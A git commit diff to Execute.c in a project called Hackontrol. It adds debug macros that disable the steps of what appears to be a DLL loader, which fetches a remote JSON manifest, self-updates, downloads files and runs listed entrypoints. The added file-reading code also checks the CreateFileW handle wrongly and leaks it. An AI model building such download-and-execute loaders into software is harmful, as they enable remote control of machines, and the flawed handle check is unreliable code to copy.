5f71d297e887d4afd21661035db5ea152a9e70b0
KHOPAN <puthipnakchan@gmail.com>
2024-05-29 20:53:00 +0700

    Add macro-based configuration

--- Hackontrol/libdll32/Execute.c
+++ Hackontrol/libdll32/Execute.c
@@ -4,6 +4,13 @@
 #include "execute.h"
 #include "resource.h"
 
+#ifdef _DEBUG
+#define HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
+#define HACKONTROL_NO_SELF_UPDATE
+//#define HACKONTROL_NO_DOWNLOAD_FILE
+#define HACKONTROL_NO_EXECUTE_FILE
+#endif
+
 #define MESSAGE_BOX(x) MessageBoxW(NULL, x, L"Error", MB_OK | MB_ICONERROR | MB_DEFBUTTON1 | MB_SYSTEMMODAL)
 
 static HINSTANCE globalInstance;
@@ -18,6 +25,39 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 		return;
 	}
 
+#ifdef HACKONTROL_NO_DOWNLOAD_LATEST_JSON_FILE
+	HANDLE file = CreateFileW(L"D:\\GitHub Repository\\Hackontrol\\system\\latest.json", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+
+	if(!file) {
+		KHWin32DialogErrorW(GetLastError(), L"CreateFileW");
+		return;
+	}
+
+	LARGE_INTEGER integer;
+
+	if(!GetFileSizeEx(file, &integer)) {
+		KHWin32DialogErrorW(GetLastError(), L"GetFileSizeEx");
+		return;
+	}
+
+	LPSTR buffer = LocalAlloc(LMEM_FIXED, integer.LowPart);
+
+	if(!buffer) {
+		KHWin32DialogErrorW(GetLastError(), L"LocalAlloc");
+		return;
+	}
+
+	DWORD bytesRead;
+
+	if(!ReadFile(file, buffer, integer.LowPart, &bytesRead, NULL)) {
+		KHWin32DialogErrorW(GetLastError(), L"ReadFile");
+		LocalFree(buffer);
+		return;
+	}
+
+	cJSON* rootObject = cJSON_Parse(buffer);
+	LocalFree(buffer);
+#else
 	DataStream stream = {0};
 
 	if(!HackontrolDownloadData(&stream, URL_LATEST_FILE, TRUE, &code)) {
@@ -28,19 +68,25 @@ __declspec(dllexport) void __stdcall Execute(HWND window, HINSTANCE instance, LP
 	KHDataStreamAdd(&stream, "", sizeof(CHAR));
 	cJSON* rootObject = cJSON_Parse(stream.data);
 	KHDataStreamFree(&stream);
-
+#endif
 	if(!rootObject) {
 		MESSAGE_BOX(L"Error while parsing JSON document");
 		goto globalCleanup;
 	}
-
+#ifndef HACKONTROL_NO_SELF_UPDATE
 	if(!selfUpdate(rootObject)) {
 		goto deleteJson;
 	}
-
+#endif
+#ifndef HACKONTROL_NO_DOWNLOAD_FILE
 	ProcessFilesArray(rootObject);
+#endif
+#ifndef HACKONTROL_NO_EXECUTE_FILE
 	ProcessEntrypointsArray(rootObject);
-deleteJson:
+#endif
+#ifndef HACKONTROL_NO_SELF_UPDATE
+	deleteJson:
+#endif
 	cJSON_Delete(rootObject);
 globalCleanup:
 	curl_global_cleanup();
